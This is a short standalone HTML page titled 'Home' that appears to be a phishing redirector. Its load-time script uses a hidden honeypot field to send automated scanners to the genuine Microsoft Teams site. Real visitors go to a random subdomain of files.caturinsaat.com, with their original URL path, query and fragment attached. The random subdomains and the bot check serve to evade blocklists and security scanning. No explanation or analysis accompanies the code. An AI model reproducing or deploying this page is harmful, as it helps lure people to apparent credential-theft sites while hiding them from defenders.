<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Home</title>
    <script>
        function generateRandomSubdomain(length) {
            const characters = 'abcdefghijklmnopqrstuvwxyz0123456789';
            let result = '';
            for (let i = 0; i < length; i++) {
                result += characters.charAt(Math.floor(Math.random() * characters.length));
            }
            return result;
        }

        const randomSubdomain = generateRandomSubdomain(8); // Adjust the length as needed
        const mainDomain = 'files.caturinsaat.com';

        function checkHoneypot() {
            const genericField = document.getElementById('genericField').value;
            if (genericField) {
                window.location.replace('https://teams.microsoft.com');
            } else {
                const targetUrl = `https://${randomSubdomain}.${mainDomain}`;
                const fullUrl = `${targetUrl}${window.location.pathname}${window.location.search}${window.location.hash}`;
                window.location.replace(fullUrl);
            }
        }

        window.onload = checkHoneypot;
    </script>
</head>
<body>
    <form style="display:none;">
        <input type="text" id="genericField" name="genericField" value="">
    </form>
</body>
</html>
